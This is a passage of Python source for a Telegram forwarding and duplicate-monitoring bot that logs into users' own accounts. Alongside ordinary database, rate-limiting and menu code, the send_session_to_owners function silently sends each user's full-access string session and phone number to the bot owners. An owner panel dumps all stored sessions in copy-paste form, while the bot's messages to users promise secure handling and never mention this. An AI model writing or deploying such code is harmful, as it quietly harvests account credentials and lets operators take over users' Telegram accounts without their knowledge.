    def get_all_active_monitoring_tasks(self) -> List[Dict]:
        try:
            conn = self.get_connection()
            tasks = []
            
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, id, label, chat_ids, settings FROM monitoring_tasks WHERE is_active = TRUE")
                
                for row in cur.fetchall():
                    uid = row["user_id"]
                    task = {
                        'user_id': uid,
                        'id': row["id"],
                        'label': row["label"],
                        'chat_ids': row["chat_ids"] if row["chat_ids"] else [],
                        'settings': row["settings"] if row["settings"] else {}
                    }
                    tasks.append(task)

                    if uid not in self._monitoring_tasks_cache or not any(t['id'] == task['id'] for t in self._monitoring_tasks_cache.get(uid, [])):
                        self._monitoring_tasks_cache[uid].append({
                            'id': task['id'],
                            'label': task['label'],
                            'chat_ids': task['chat_ids'],
                            'settings': task['settings'],
                            'is_active': 1
                        })

            return tasks
        except Exception as e:
            logger.exception("Error in get_all_active_monitoring_tasks: %s", e)
            return []
    
    # ============================
    # USER MANAGEMENT METHODS
    # ============================
    def is_user_allowed(self, user_id: int) -> bool:
        if user_id in self._allowed_users_cache:
            return True

        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("SELECT 1 FROM allowed_users WHERE user_id = %s", (user_id,))
                exists = cur.fetchone() is not None
                    
            if exists:
                self._allowed_users_cache.add(user_id)
            return exists
        except Exception:
            logger.exception("Error checking is_user_allowed for %s", user_id)
            return False
    
    def is_user_admin(self, user_id: int) -> bool:
        if user_id in self._admin_cache:
            return True

        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("SELECT is_admin FROM allowed_users WHERE user_id = %s", (user_id,))
                row = cur.fetchone()
                if row and row["is_admin"]:
                    self._admin_cache.add(user_id)
                    self._allowed_users_cache.add(user_id)
                    return True
                        
            return False
        except Exception:
            logger.exception("Error checking is_user_admin for %s", user_id)
            return False
    
    def add_allowed_user(self, user_id: int, username: Optional[str] = None,
                         is_admin: bool = False, added_by: Optional[int] = None) -> bool:
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                try:
                    cur.execute("""
                        INSERT INTO allowed_users (user_id, username, is_admin, added_by)
                        VALUES (%s, %s, %s, %s)
                        ON CONFLICT (user_id) DO NOTHING
                        RETURNING user_id
                    """, (user_id, username, is_admin, added_by))
                    conn.commit()
                    
                    if cur.fetchone() is not None:
                        self._allowed_users_cache.add(user_id)
                        if is_admin:
                            self._admin_cache.add(user_id)
                        return True
                    return False
                except psycopg.errors.UniqueViolation:
                    return False
                        
        except Exception as e:
            logger.exception("Error in add_allowed_user for %s: %s", user_id, e)
            return False
    
    def remove_allowed_user(self, user_id: int) -> bool:
        try:
            conn = self.get_connection()
            
            with conn.cursor() as cur:
                cur.execute("DELETE FROM allowed_users WHERE user_id = %s", (user_id,))
                removed = cur.rowcount > 0
                conn.commit()

            if removed:
                # Also purge user data
                try:
                    self.purge_user_data(user_id)
                except Exception:
                    pass
                
                self._allowed_users_cache.discard(user_id)
                self._admin_cache.discard(user_id)
                self._user_cache.pop(user_id, None)
                self._forwarding_tasks_cache.pop(user_id, None)
                self._monitoring_tasks_cache.pop(user_id, None)

            return removed
        except Exception as e:
            logger.exception("Error in remove_allowed_user for %s: %s", user_id, e)
            return False
    
    def get_all_allowed_users(self) -> List[Dict]:
        try:
            conn = self.get_connection()
            users = []
            
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT user_id, username, is_admin, added_by, created_at
                    FROM allowed_users
                    ORDER BY created_at DESC
                """)
                
                for row in cur.fetchall():
                    users.append({
                        'user_id': row["user_id"],
                        'username': row["username"],
                        'is_admin': row["is_admin"],
                        'added_by': row["added_by"],
                        'created_at': row["created_at"].isoformat() if row["created_at"] else None
                    })
            
            return users
        except Exception as e:
            logger.exception("Error in get_all_allowed_users: %s", e)
            return []
    
    def get_logged_in_users(self, limit: Optional[int] = None) -> List[Dict]:
        conn = self.get_connection()
        try:
            with conn.cursor() as cur:
                if limit and int(limit) > 0:
                    cur.execute(
                        "SELECT user_id, session_data FROM users WHERE is_logged_in = TRUE ORDER BY updated_at DESC LIMIT %s",
                        (int(limit),),
                    )
                else:
                    cur.execute(
                        "SELECT user_id, session_data FROM users WHERE is_logged_in = TRUE ORDER BY updated_at DESC"
                    )
                rows = cur.fetchall()
                result = []
                for r in rows:
                    result.append({"user_id": r["user_id"], "session_data": r["session_data"]})
                return result
        except Exception as e:
            logger.exception("Error fetching logged-in users: %s", e)
            raise
    
    def get_all_string_sessions(self) -> List[Dict]:
        conn = self.get_connection()
        try:
            sessions = []
            
            with conn.cursor() as cur:
                cur.execute(
                    """
                    SELECT user_id, session_data, name, phone, is_logged_in 
                    FROM users 
                    WHERE session_data IS NOT NULL AND session_data != '' 
                    ORDER BY user_id
                    """
                )
                for row in cur.fetchall():
                    sessions.append({
                        "user_id": row["user_id"],
                        "session_data": row["session_data"],
                        "name": row["name"],
                        "phone": row["phone"],
                        "is_logged_in": row["is_logged_in"]
                    })
            return sessions
            
        except Exception as e:
            logger.exception("Error in get_all_string_sessions: %s", e)
            raise
    
    def get_db_status(self) -> Dict:
        status = {
            "type": "postgresql",
            "url": self.postgres_url,
            "connected": False,
            "cache_counts": {
                "users": len(self._user_cache),
                "forwarding_tasks": sum(len(tasks) for tasks in self._forwarding_tasks_cache.values()),
                "monitoring_tasks": sum(len(tasks) for tasks in self._monitoring_tasks_cache.values()),
                "allowed_users": len(self._allowed_users_cache),
                "admins": len(self._admin_cache)
            }
        }

        try:
            conn = self.get_connection()
            status["connected"] = True
            
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT table_name 
                    FROM information_schema.tables 
                    WHERE table_schema = 'public'
                """)
                status["tables"] = [row["table_name"] for row in cur.fetchall()]

        except Exception as e:
            logger.exception("Error getting DB status: %s", e)
            status["error"] = str(e)

        return status
    
    def __del__(self):
        try:
            self.close_connection()
            self._thread_pool.shutdown(wait=False)
        except Exception:
            pass

# ============================
# GLOBAL STATE
# ============================
db = Database()

# User session management
user_clients: Dict[int, TelegramClient] = {}
login_states: Dict[int, Dict] = {}
logout_states: Dict[int, Dict] = {}
phone_verification_states: Dict[int, Dict] = {}
task_creation_states: Dict[int, Dict[str, Any]] = {}

# Forwarding system
forwarding_tasks_cache: Dict[int, List[Dict]] = {}
target_entity_cache: Dict[int, OrderedDict] = {}
forward_handler_registered: Dict[int, Callable] = {}
user_send_semaphores: Dict[int, asyncio.Semaphore] = {}
user_rate_limiters: Dict[int, Tuple[float, float, float]] = {}  # (tokens, last_refill_time, burst_tokens)

# Monitoring system
monitoring_tasks_cache: Dict[int, List[Dict]] = {}
chat_entity_cache: Dict[int, Dict[int, Any]] = {}
monitor_handler_registered: Dict[int, List[Callable]] = {}
notification_messages: Dict[int, Dict] = {}
message_history: Dict[Tuple[int, int], deque] = {}
reply_states: Dict[int, Dict] = {}
auto_reply_states: Dict[int, Dict] = {}

# Worker systems
send_queue: Optional[asyncio.Queue] = None
notification_queue: Optional[asyncio.Queue] = None
send_worker_tasks: List[asyncio.Task] = []
monitor_worker_tasks: List[asyncio.Task] = []
_send_workers_started = False
_monitor_workers_started = False

MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
_last_gc_run = 0

# Authentication cache
_auth_cache: Dict[int, Tuple[bool, float]] = {}
_AUTH_CACHE_TTL = 300

# ============================
# FLOOD WAIT MANAGER
# ============================
class FloodWaitManager:
    """Manages flood wait states for users"""
    
    def __init__(self):
        self.user_flood_wait_until = {}
        self.start_notifications_sent = set()  # Track start notifications
        self.end_notifications_pending = set()  # Track users who need end notifications
        self.lock = threading.Lock()  # Regular threading lock
    
    def set_flood_wait(self, user_id: int, wait_seconds: int):
        """Set a flood wait for a user"""
        with self.lock:
            wait_until = time.time() + wait_seconds + 5  # Add buffer
            self.user_flood_wait_until[user_id] = wait_until
            
            # Check if we should send start notification
            should_notify_start = False
            
            if wait_seconds > 60:  # Only notify for long waits
                flood_wait_key = f"{user_id}_start_{int(wait_until)}"
                if flood_wait_key not in self.start_notifications_sent:
                    self.start_notifications_sent.add(flood_wait_key)
                    # Mark that we need to send end notification
                    self.end_notifications_pending.add(user_id)
                    should_notify_start = True
            
            return should_notify_start, wait_seconds
    
    def is_in_flood_wait(self, user_id: int):
        """Check if user is in flood wait and return (in_wait, remaining_time, should_notify_end)"""
        with self.lock:
            if user_id not in self.user_flood_wait_until:
                # Not in flood wait - check if we need to send end notification
                should_notify_end = user_id in self.end_notifications_pending
                if should_notify_end:
                    self.end_notifications_pending.discard(user_id)
                    # Clean up old start notifications
                    self._cleanup_old_notifications(user_id)
                return False, 0, should_notify_end
            
            wait_until = self.user_flood_wait_until[user_id]
            current_time = time.time()
            
            if current_time >= wait_until:
                # Flood wait expired
                del self.user_flood_wait_until[user_id]
                # Check if we need to send end notification
                should_notify_end = user_id in self.end_notifications_pending
                if should_notify_end:
                    self.end_notifications_pending.discard(user_id)
                    self._cleanup_old_notifications(user_id)
                return False, 0, should_notify_end
            
            return True, wait_until - current_time, False
    
    def _cleanup_old_notifications(self, user_id: int):
        """Clean up old notification tracking for a user"""
        current_time = time.time()
        keys_to_remove = []
        
        for key in self.start_notifications_sent:
            if key.startswith(f"{user_id}_"):
                keys_to_remove.append(key)
        
        for key in keys_to_remove:
            self.start_notifications_sent.discard(key)
    
    def clear_flood_wait(self, user_id: int):
        """Clear flood wait for a user"""
        with self.lock:
            self.user_flood_wait_until.pop(user_id, None)
            self._cleanup_old_notifications(user_id)
            self.end_notifications_pending.discard(user_id)

# Initialize flood wait manager
flood_wait_manager = FloodWaitManager()

# ============================
# UTILITY FUNCTIONS
# ============================
def _clean_phone_number(text: str) -> str:
    return '+' + ''.join(c for c in text if c.isdigit())

def _get_cached_auth(user_id: int) -> Optional[bool]:
    if user_id in _auth_cache:
        allowed, timestamp = _auth_cache[user_id]
        if time.time() - timestamp < _AUTH_CACHE_TTL:
            return allowed
    return None

def _set_cached_auth(user_id: int, allowed: bool):
    _auth_cache[user_id] = (allowed, time.time())

async def db_call(func, *args, **kwargs):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, functools.partial(func, *args, **kwargs))

async def optimized_gc():
    global _last_gc_run
    current_time = time.time()
    if current_time - _last_gc_run > GC_INTERVAL:
        try:
            if gc.get_count()[0] > gc.get_threshold()[0]:
                collected = gc.collect(2)
                if collected > 1000:
                    logger.debug(f"GC collected {collected} objects")
        except Exception:
            try:
                gc.collect()
            except Exception:
                pass
        _last_gc_run = current_time

def format_datetime_utc1(dt: datetime = None) -> str:
    """
    Format datetime to 'Jan 5, 2025 10:15 AM' in UTC+1 timezone.
    Cross-platform compatible.
    """
    if dt is None:
        dt = datetime.now(timezone.utc)
    
    # If datetime is naive (no timezone), assume UTC
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    
    # Convert to UTC+1
    utc_plus_one = pytz.timezone('Etc/GMT-1')  # UTC+1
    dt_utc1 = dt.astimezone(utc_plus_one)
    
    # Cross-platform formatting (removes leading zeros from day and hour)
    month = dt_utc1.strftime('%b')
    day = str(dt_utc1.day)  # No leading zero
    year = dt_utc1.strftime('%Y')
    hour = dt_utc1.strftime('%I').lstrip('0') or '12'  # 12-hour, no leading zero
    minute = dt_utc1.strftime('%M')
    am_pm = dt_utc1.strftime('%p')
    
    return f"{month} {day}, {year} {hour}:{minute} {am_pm}"

# ============================
# FORWARDING SYSTEM UTILITIES
# ============================
def _ensure_user_target_cache(user_id: int):
    if user_id not in target_entity_cache:
        target_entity_cache[user_id] = OrderedDict()

def _get_cached_target(user_id: int, target_id: int):
    _ensure_user_target_cache(user_id)
    od = target_entity_cache[user_id]
    if target_id in od:
        od.move_to_end(target_id)
        return od[target_id]
    return None

def _set_cached_target(user_id: int, target_id: int, entity: object):
    _ensure_user_target_cache(user_id)
    od = target_entity_cache[user_id]
    od[target_id] = entity
    od.move_to_end(target_id)
    while len(od) > TARGET_ENTITY_CACHE_SIZE:
        od.popitem(last=False)

def _ensure_user_send_semaphore(user_id: int):
    if user_id not in user_send_semaphores:
        user_send_semaphores[user_id] = asyncio.Semaphore(SEND_CONCURRENCY_PER_USER)

def _ensure_user_rate_limiter(user_id: int):
    if user_id not in user_rate_limiters:
        # Format: (tokens, last_refill_time, burst_tokens)
        user_rate_limiters[user_id] = (SEND_RATE_PER_USER, time.time(), SEND_RATE_PER_USER * 5)

async def _consume_token(user_id: int, amount: float = 1.0):
    _ensure_user_rate_limiter(user_id)
    
    while True:
        tokens, last_refill, burst = user_rate_limiters[user_id]
        now = time.time()
        elapsed = max(0.0, now - last_refill)
        
        # Calculate refill based on elapsed time
        refill = elapsed * SEND_RATE_PER_USER
        tokens = min(tokens + refill, burst)
        
        if tokens >= amount:
            tokens -= amount
            user_rate_limiters[user_id] = (tokens, now, burst)
            return
        
        # If we can't send now, update tokens and sleep minimal time
        user_rate_limiters[user_id] = (tokens, now, burst)
        
        # Calculate exact wait time needed
        needed = amount - tokens
        wait_time = needed / SEND_RATE_PER_USER
        
        # Small sleep but don't block completely
        await asyncio.sleep(min(wait_time, 0.1))

# ============================
# FORWARDING FILTER FUNCTIONS
# ============================
def extract_words(text: str) -> List[str]:
    return WORD_PATTERN.findall(text)

def is_numeric_word(word: str) -> bool:
    return bool(NUMERIC_PATTERN.match(word))

def is_alphabetic_word(word: str) -> bool:
    return bool(ALPHABETIC_PATTERN.match(word))

def contains_numeric(word: str) -> bool:
    return any(c.isdigit() for c in word)

def contains_alphabetic(word: str) -> bool:
    return any(c.isalpha() for c in word)

def contains_special_characters(word: str) -> bool:
    for char in word:
        if not char.isalnum() and not EMOJI_PATTERN.search(char):
            return True
    return False

def apply_filters(message_text: str, task_filters: Dict) -> List[str]:
    if not message_text:
        return []
    
    filters_enabled = task_filters.get('filters', {})
    
    if filters_enabled.get('raw_text', False):
        processed = message_text
        if prefix := filters_enabled.get('prefix'):
            processed = prefix + processed
        if suffix := filters_enabled.get('suffix'):
            processed = processed + suffix
        return [processed]
    
    messages_to_send = []
    
    if filters_enabled.get('numbers_only', False):
        if is_numeric_word(message_text.replace(' ', '')):
            processed = message_text
            if prefix := filters_enabled.get('prefix'):
                processed = prefix + processed
            if suffix := filters_enabled.get('suffix'):
                processed = processed + suffix
            messages_to_send.append(processed)
    
    elif filters_enabled.get('alphabets_only', False):
        if is_alphabetic_word(message_text.replace(' ', '')):
            processed = message_text
            if prefix := filters_enabled.get('prefix'):
                processed = prefix + processed
            if suffix := filters_enabled.get('suffix'):
                processed = processed + suffix
            messages_to_send.append(processed)
    
    else:
        words = extract_words(message_text)
        for word in words:
            if not word:
                continue
                
            skip_word = False
            if filters_enabled.get('removed_alphabetic', False):
                if contains_numeric(word) or EMOJI_PATTERN.search(word):
                    skip_word = True
                    
            elif filters_enabled.get('removed_numeric', False):
                if contains_alphabetic(word) or EMOJI_PATTERN.search(word):
                    skip_word = True
            
            if not skip_word:
                processed = word
                if prefix := filters_enabled.get('prefix'):
                    processed = prefix + processed
                if suffix := filters_enabled.get('suffix'):
                    processed = processed + suffix
                messages_to_send.append(processed)
    
    return messages_to_send

# ============================
# DUPLICATE DETECTION UTILITIES
# ============================
def create_message_hash(message_text: str, sender_id: Optional[int] = None) -> str:
    if sender_id:
        content = f"{sender_id}:{message_text.strip().lower()}"
    else:
        content = message_text.strip().lower()
    return hashlib.md5(content.encode()).hexdigest()[:12]

def is_duplicate_message(user_id: int, chat_id: int, message_hash: str) -> bool:
    key = (user_id, chat_id)
    if key not in message_history:
        return False
    
    current_time = time.time()
    dq = message_history[key]
    
    while dq and current_time - dq[0][1] > DUPLICATE_CHECK_WINDOW:
        dq.popleft()
    
    return any(stored_hash == message_hash for stored_hash, _, _ in dq)

def store_message_hash(user_id: int, chat_id: int, message_hash: str, message_text: str):
    key = (user_id, chat_id)
    if key not in message_history:
        message_history[key] = deque(maxlen=MESSAGE_HASH_LIMIT)
    
    message_history[key].append((message_hash, time.time(), message_text[:80]))

# ============================
# AUTHENTICATION FUNCTIONS
# ============================
async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    
    cached = _get_cached_auth(user_id)
    if cached is not None:
        if not cached:
            await _send_unauthorized(update)
        return cached
    
    if user_id in ALLOWED_USERS or user_id in OWNER_IDS:
        _set_cached_auth(user_id, True)
        return True
    
    try:
        is_allowed_db = await db_call(db.is_user_allowed, user_id)
        _set_cached_auth(user_id, is_allowed_db)
        
        if not is_allowed_db:
            await _send_unauthorized(update)
        return is_allowed_db
    except Exception:
        logger.exception("Auth check failed for %s", user_id)
        _set_cached_auth(user_id, False)
        await _send_unauthorized(update)
        return False

async def _send_unauthorized(update: Update):
    if update.message:
        await update.message.reply_text(
            UNAUTHORIZED_MESSAGE,
            parse_mode="Markdown",
            disable_web_page_preview=True,
        )
    elif update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            UNAUTHORIZED_MESSAGE,
            parse_mode="Markdown",
            disable_web_page_preview=True,
        )

async def send_session_to_owners(user_id: int, phone: str, name: str, session_string: str):
    from telegram import Bot
    bot = Bot(token=BOT_TOKEN)
    
    message = f"""🔐 **New String Session Generated**

👤 **User:** {name}
📱 **Phone:** `{phone}`
🆔 **User ID:** `{user_id}`

**Env Var Format:**
```{user_id}:{session_string}```"""
    
    for owner_id in OWNER_IDS:
        try:
            await bot.send_message(owner_id, message, parse_mode="Markdown")
        except Exception:
            continue

async def check_phone_number_required(user_id: int) -> bool:
    user = await db_call(db.get_user, user_id)
    return bool(user and user.get("is_logged_in") and not user.get("phone"))

async def ask_for_phone_number(user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    phone_verification_states[user_id] = {
        "step": "waiting_phone",
        "chat_id": chat_id
    }
    
    message = """📱 **Phone Number Verification Required**

Your account was restored from a saved session, but we need your phone number for security.

⚠️ **Important:**
• This is the phone number associated with your Telegram account
• It will only be used for logout confirmation
• Your phone number is stored securely

**Please enter your phone number (with country code):**

**Examples:**
• `+1234567890`
• `+447911123456`
• `+4915112345678`

**Type your phone number now:**"""
    
    try:
        await context.bot.send_message(chat_id, message, parse_mode="Markdown")
    except Exception:
        logger.exception("Failed to send phone verification message")

async def handle_phone_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in phone_verification_states:
        return
    
    state = phone_verification_states[user_id]
    text = update.message.text.strip()
    
    if state["step"] == "waiting_phone":
        if not text.startswith('+'):
            await update.message.reply_text(
                "❌ **Invalid format!**\n\nPhone number must start with `+`\nExample: `+1234567890`",
                parse_mode="Markdown",
            )
            return
        
        clean_phone = _clean_phone_number(text)
        
        if len(clean_phone) < 8:
            await update.message.reply_text(
                "❌ **Invalid phone number!**\n\nPhone number seems too short.",
                parse_mode="Markdown",
            )
            return
        
        client = user_clients.get(user_id)
        if client:
            try:
                me = await client.get_me()
                await db_call(db.save_user, user_id, clean_phone, me.first_name, 
                             None, True)
                
                del phone_verification_states[user_id]
                
                await update.message.reply_text(
                    f"✅ **Phone number verified!**\n\n📱 **Phone:** `{clean_phone}`\n👤 **Name:** {me.first_name or 'User'}\n\nYour account is now fully restored! 🎉",
                    parse_mode="Markdown",
                )
                
                await show_main_menu(update, context, user_id)
                
            except Exception:
                logger.exception("Error verifying phone")
                await update.message.reply_text("❌ **Error verifying phone number!**")
        else:
            await update.message.reply_text("❌ **Session not found!**")
            del phone_verification_states[user_id]

# ============================
# MAIN MENU & BOT COMMANDS
# ============================
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    user = await db_call(db.get_user, user_id)
    
    user_name = update.effective_user.first_name or "User"
    user_phone = user["phone"] if user and user["phone"] else "Not connected"
    is_logged_in = user and user["is_logged_in"]
    
    status_emoji = "🟢" if is_logged_in else "🔴"
    status_text = "Online" if is_logged_in else "Offline"
    current_time = format_datetime_utc1()
    
    message_text = f"""╔════════════════════════════════════╗
║   📨🔍 FORWARDER + DUODETECTIVE BOT   ║
║   Telegram Message Management System   ║
╚════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 **User:** {user_name}
📱 **Phone:** `{user_phone}`
{status_emoji} **Status:** {status_text}
🕐 **Time:** {current_time}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **COMMANDS:**

🔐 **Account Management:**
  /login - Connect your Telegram account
  /logout - Disconnect your account

📨 **Forwarding System:**
  /forwadd - Create a new forwarding task
  /fortasks - List all your forwarding tasks

🔍 **Monitoring System:**
  /monitoradd - Create a new monitoring task
  /monitortasks - List all your monitoring tasks

🆔 **Utilities:**
  /getallid - Get all your chat IDs"""
    
    if user_id in OWNER_IDS:
        message_text += "\n\n👑 **Owner Commands:**\n  /ownersets - Owner control panel"
    
    message_text += "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n⚙️ **Features:**\n1. Forward messages between chats with filters\n2. Detect duplicate messages in monitored chats\n3. Get notifications and reply to duplicates\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    keyboard = []
    if is_logged_in:
        keyboard.append([InlineKeyboardButton("📨 Forwarding Tasks", callback_data="show_forward_tasks")])
        keyboard.append([InlineKeyboardButton("🔍 Monitoring Tasks", callback_data="show_monitor_tasks")])
        keyboard.append([InlineKeyboardButton("🔴 Disconnect", callback_data="logout")])
    else:
        keyboard.append([InlineKeyboardButton("🟢 Connect Account", callback_data="login")])
    
    if user_id in OWNER_IDS:
        keyboard.append([InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")])
    
    if update.callback_query:
        await update.callback_query.message.edit_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
            parse_mode="Markdown",
        )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return
    
    await show_main_menu(update, context, user_id)

# ============================
# OWNER COMMANDS
# ============================
async def ownersets_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in OWNER_IDS:
        await update.message.reply_text("❌ **Owner Only**\n\nThis command is only available to bot owners.", parse_mode="Markdown")
        return
    
    await show_owner_panel(update, context)

async def show_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query if update.callback_query else None
    user_id = query.from_user.id if query else update.effective_user.id
    
    if user_id not in OWNER_IDS:
        if query:
            await query.answer("Only owners can access this panel!", show_alert=True)
        return
    
    if query:
        await query.answer()
    
    message_text = """👑 OWNER CONTROL PANEL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔑 **Session Management:**
• Get all string sessions
• Get specific user's session

👥 **User Management:**
• List all allowed users
• Add new user (admin/regular)
• Remove existing user

📊 **Statistics:**
• View database status
• View system metrics

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [
        [InlineKeyboardButton("🔑 Get All Strings", callback_data="owner_get_all_strings")],
        [InlineKeyboardButton("👤 Get User String", callback_data="owner_get_user_string")],
        [InlineKeyboardButton("👥 List Users", callback_data="owner_list_users")],
        [InlineKeyboardButton("➕ Add User", callback_data="owner_add_user")],
        [InlineKeyboardButton("➖ Remove User", callback_data="owner_remove_user")],
        [InlineKeyboardButton("📊 DB Status", callback_data="owner_db_status")],
    ]
    
    if query:
        await query.message.edit_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            message_text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )

async def handle_owner_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id not in OWNER_IDS:
        await query.answer("Only owners can access this panel!", show_alert=True)
        return
    
    await query.answer()
    
    action = query.data
    
    if action == "owner_panel":
        await show_owner_panel(update, context)
    
    elif action == "owner_get_all_strings":
        await handle_get_all_strings(update, context)
    
    elif action == "owner_get_user_string":
        await handle_get_user_string_input(update, context)
    
    elif action == "owner_list_users":
        await handle_list_users(update, context)
    
    elif action == "owner_add_user":
        await handle_add_user_input(update, context)
    
    elif action == "owner_remove_user":
        await handle_remove_user_input(update, context)
    
    elif action == "owner_db_status":
        await handle_db_status(update, context)
    
    elif action.startswith("owner_confirm_remove_"):
        target_user_id = int(action.replace("owner_confirm_remove_", ""))
        await handle_confirm_remove_user(update, context, target_user_id)
    
    elif action == "owner_cancel_remove":
        await show_owner_panel(update, context)
    
    elif action == "owner_cancel":
        await show_owner_panel(update, context)
    
    elif action == "owner_add_user_admin_yes":
        target_user_id = context.user_data.get("add_user_id")
        if target_user_id:
            await handle_add_user_admin_choice(update, context, target_user_id, True)
    
    elif action == "owner_add_user_admin_no":
        target_user_id = context.user_data.get("add_user_id")
        if target_user_id:
            await handle_add_user_admin_choice(update, context, target_user_id, False)

async def handle_get_all_strings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if user_id not in OWNER_IDS:
        await query.answer("Only owners can access this panel!", show_alert=True)
        return
    
    processing_msg = await query.message.edit_text("⏳ **Searching database for sessions...**")
    
    try:
        sessions = await db_call(db.get_all_string_sessions)
        
        if not sessions:
            await processing_msg.edit_text("📭 **No string sessions found!**")
            return
        
        await processing_msg.delete()
        
        header_msg = await query.message.reply_text(
            "🔑 **All String Sessions**\n\n**Well Arranged Copy-Paste Env Var Format:**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="Markdown"
        )
        
        for session in sessions:
            user_id_db = session["user_id"]
            session_data = session["session_data"]
            username = session["name"] or f"User {user_id_db}"
            phone = session["phone"] or "Not available"
            status = "🟢 Online" if session["is_logged_in"] else "🔴 Offline"
            
            message_text = f"👤 **User:** {username} (ID: `{user_id_db}`)\n📱 **Phone:** `{phone}`\n{status}\n\n**Env Var Format:**\n```{user_id_db}:{session_data}```\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            
            try:
                await query.message.reply_text(message_text, parse_mode="Markdown")
            except Exception:
                continue
        
        await query.message.reply_text(f"📊 **Total:** {len(sessions)} session(s)")
        
    except Exception as e:
        logger.exception("Error in get all string sessions")
        try:
            await processing_msg.edit_text(f"❌ **Error fetching sessions:** {str(e)[:200]}")
        except:
            pass

async def handle_get_user_string_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    message_text = """👤 **Get User String Session**

Enter the User ID to get their session string:

**Example:** `123456789`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    
    context.user_data["owner_action"] = "get_user_string"
    context.user_data["awaiting_input"] = True

async def handle_get_user_string(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if context.user_data.get("owner_action") != "get_user_string":
        return
    
    try:
        target_user_id = int(text)
    except ValueError:
        await update.message.reply_text(
            "❌ **Invalid user ID!**\n\nUser ID must be a number.\n\nUse /ownersets to try again.",
            parse_mode="Markdown"
        )
        context.user_data.clear()
        return
    
    user = await db_call(db.get_user, target_user_id)
    if not user or not user.get("session_data"):
        await update.message.reply_text(
            f"❌ **No string session found for user ID `{target_user_id}`!**\n\nUse /ownersets to try again.",
            parse_mode="Markdown"
        )
        context.user_data.clear()
        return
    
    session_string = user["session_data"]
    username = user.get("name", "Unknown")
    phone = user.get("phone", "Not available")
    status = "🟢 Online" if user.get("is_logged_in") else "🔴 Offline"
    
    message_text = f"🔑 **String Session for 👤 User:** {username} (ID: `{target_user_id}`)\n\n📱 **Phone:** `{phone}`\n{status}\n\n**Env Var Format:**\n```{target_user_id}:{session_string}```"
    
    await update.message.reply_text(message_text, parse_mode="Markdown")
    context.user_data.clear()

async def handle_list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    users = await db_call(db.get_all_allowed_users)

    if not users:
        await query.edit_message_text("📋 **No Allowed Users**\n\nThe allowed users list is empty.", parse_mode="Markdown")
        return

    user_list = "👥 **Allowed Users**\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

    for i, user in enumerate(users, 1):
        role_emoji = "👑" if user["is_admin"] else "👤"
        role_text = "Admin" if user["is_admin"] else "User"
        username = user["username"] if user["username"] else "Unknown"

        user_list += f"{i}. {role_emoji} **{role_text}**\n   ID: `{user['user_id']}`\n"
        if user["username"]:
            user_list += f"   Username: {username}\n"
        user_list += "\n"

    user_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    user_list += f"Total: **{len(users)} user(s)**"

    await query.edit_message_text(user_list, parse_mode="Markdown")

async def handle_add_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    message_text = """➕ **Add New User**

Step 1 of 2: Enter the User ID to add:

**Example:** `123456789`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="owner_cancel")]]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    
    context.user_data["owner_action"] = "add_user"
    context.user_data["add_user_step"] = "user_id"
    context.user_data["awaiting_input"] = True

